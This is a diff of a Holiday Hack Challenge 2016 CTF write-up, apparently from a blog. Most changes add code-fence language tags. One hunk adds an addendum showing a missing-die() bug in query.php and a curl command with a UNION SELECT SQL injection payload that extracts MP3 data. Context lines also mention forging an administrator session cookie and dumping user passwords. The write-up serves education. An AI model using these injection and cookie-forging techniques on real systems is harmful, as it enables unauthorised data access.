@@ -341,7 +341,7 @@ One notable feature is the ability to save analytics reports.  It’s *particula
 
 Code allowing any column to be updated:
 
-~~~
+~~~ php?start_inline=1
 $row = mysqli_fetch_assoc($result);
 # Update the row with the new values
 $set = [];
@@ -358,7 +358,7 @@ This edit function is allegedly restricted to not allow any users access:
 
 (edit.php)
 
-~~~
+~~~ php?start_inline=1
 # Don't allow anybody to access this page (yet!)
 restrict_page_to_users($db, []);
 ~~~
@@ -367,7 +367,7 @@ However, if we investigate the `restrict_page_to_users` function, we find that i
 
 (db.php)
  
-~~~
+~~~ php?start_inline=1
 function check_access($db, $username, $users) {
   # Allow administrator to access any page
   if($username == 'administrator') {
@@ -383,7 +383,7 @@ Earlier I foreshadowed the value of having access to the git repository for the 
 
 This allows us to encrypt our own session cookie as administrator.  I hacked together a short script to create a new `AUTH` cookie:
 
-~~~
+~~~ php
 <?PHP
 include('crypto.php');
 print encrypt(json_encode([
@@ -401,6 +401,37 @@ I wanted the following query: ``SELECT  `id`,`username`,`filename`,hex(`mp3`) FR
 Then I ran the report with the saved report functionality, and extracted the hex and decoded it to reveal the other MP3 file.  Based on the filename stored in the report, I saved it to my audio directory with the name discombobulatedaudio7.mp3.  From the query results, we know these are the only 2 MP3s in the audio table, so it seems like it’s time to move on to the next server, but I decided to grab the passwords from the users table by updating the query again, just in case they might be useful later:
 
 ![](/img/blog/hhc2016/image_16.png)
+
+#### Addendum: An Unintentional Vulnerability
+
+After finishing all of the challenges, I happened to be looking back at this one when I discovered a 2nd vulnerability, which I suspect was not intended as part of the challenge.  If you notice the file query.php does a number of input validation checks, each looking something like this:
+
+~~~ php?start_inline=1
+if(!ctype_alpha($field)) {
+  reply(400, "Field name can only contain letters!");
+  die();
+}
+~~~
+
+You’ll notice the reply function sets the HTTP status code and prints a message, then the script dies to prevent further execution.  However, if you look further down (line 178), you’ll discover this check and query construction:
+
+~~~ php?start_inline=1
+$type = $_REQUEST['type'];
+if($type !== 'launch' && $type !== 'usage') {
+  reply(400, "Type has to be either 'launch' or 'usage'!");
+}
+
+$query = "SELECT * ";
+$query .= "FROM `app_" . $type . "_reports` ";
+$query .= "WHERE " . join(' AND ', $where) . " ";
+$query .= "LIMIT 0, 100";
+~~~
+
+Though it appears the author intended to limit type to the strings ‘launch’ and ‘usage’, the lack of a call to `die()` in the error handler results in the query being executed and results returned anyway!  So we can inject into the type field and steal the mp3 files using a `UNION SELECT` SQL injection:
+
+~~~
+curl 'https://analytics.northpolewonderland.com/query.php' -H 'Cookie: AUTH=82532b2136348aaa1fa7dd2243dc0dc1e10948231f339e5edd5770daf9eef18a4384f6e7bca04d87e572ba65ce9b6548b3494b6063a30265b71c76884152' -H 'Content-Type: application/x-www-form-urlencoded' --data 'date=2017-01-05&type=usage_reports` LIMIT 0 UNION SELECT id,username,filename,to_base64(mp3),NULL from audio  -- '
+~~~
 
 ### ads.northpolewonderland.com
 
@@ -497,7 +528,7 @@ Initial nmap results for dungeon.northpolewonderland.com weren’t revealing any
 
 I started playing the game briefly but, for as much as I love RPGs (I used to run several MUDs back in the 90s), I was impatient and wanted to get on with the Holiday Hack Challenge.  I started with the obvious: running `strings` both on the binary and the data file, but that gave very little headway.  I looked at Zork data file editors, but the first couple I found couldn’t decompile the provided data file (whether this is by accident, by design of the challenge, or because I picked the wrong tools, I have no idea), but that proved not to be useful.  However, on one of the sites where I was reading about reversing Zork games, I discovered a mention of a built-in debugger called GDT, or the Game Debugger Tool.  Among other things, GDT lets you dump all the information about NPCs, strings in the game, etc.  Much like I would use GNU strings to get oriented to an unknown binary, I decided to use the GDT strings dump to find all of the in-game strings.  Unfortunately, GDT required that I give it a string index and dump one at a time.  Not knowing how many strings there were, I picked 2048 for a starting point and did a little inline shell script to dump them.  I discovered that it starts to crash after about 1279, and the last handful seemed to be garbage (ok, no bounds checking, I wonder what else I could do?), so I decided to adjust my 2048 to 1200 and try again:
 
-~~~
+~~~ bash
 for i in seq 1 1200; do
     echo -n "$i: "
     echo -e "GDT\nDT\n$i\nEX\nquit\ny" | \
